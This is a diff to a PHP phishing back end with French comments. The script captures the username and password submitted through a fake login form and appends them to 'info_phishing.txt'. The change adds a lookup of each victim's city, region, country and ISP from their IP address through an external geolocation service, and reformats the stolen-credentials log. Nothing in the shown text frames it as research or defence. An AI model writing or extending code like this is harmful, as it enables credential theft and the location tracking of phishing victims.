@@ -13,14 +13,25 @@ $date = date('Y-m-d H:i:s');
 // Informations sur l'utilisateur
 $ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
+$city = $geo->city ?? 'N/A';
+$region = $geo->regionName ?? 'N/A';
+$country = $geo->country ?? 'N/A';
+$isp = $geo->isp ?? 'N/A';
 
 // Préparer les données à enregistrer
-$data = "=== IDENTIFIANTS CAPTURÉS LE $date ===\n";
-$data .= "Nom d'utilisateur: " . $_POST['username'] . "\n";
-$data .= "Mot de passe: " . $_POST['password'] . "\n";
-$data .= "Adresse IP: " . $ip . "\n";
-$data .= "User-Agent: " . $user_agent . "\n";
-$data .= "=================================\n\n";
+$data = "========= Connexion détectée =========\n";
+$data .= "🕒 Date        : $date\n";
+$data .= "🌍 IP          : $ip\n";
+$data .= "📍 Ville       : $city\n";
+$data .= "🗺️ Région      : $region\n";
+$data .= "🇨🇵 Pays        : $country\n";
+$data .= "🔌 FAI          : $isp\n";
+$data .= "🖥️ Appareil    : $user_agent\n";
+$data .= "👤 Identifiant : " . $_POST['username'] . "\n";
+$data .= "🔐 Mot de passe: " . $_POST['password'] . "\n";
+$data .= "======================================\n\n";
+
 
 // Créer le fichier info_phishing.txt avec les permissions adéquates s'il n'existe pas
 if (!file_exists("info_phishing.txt")) {
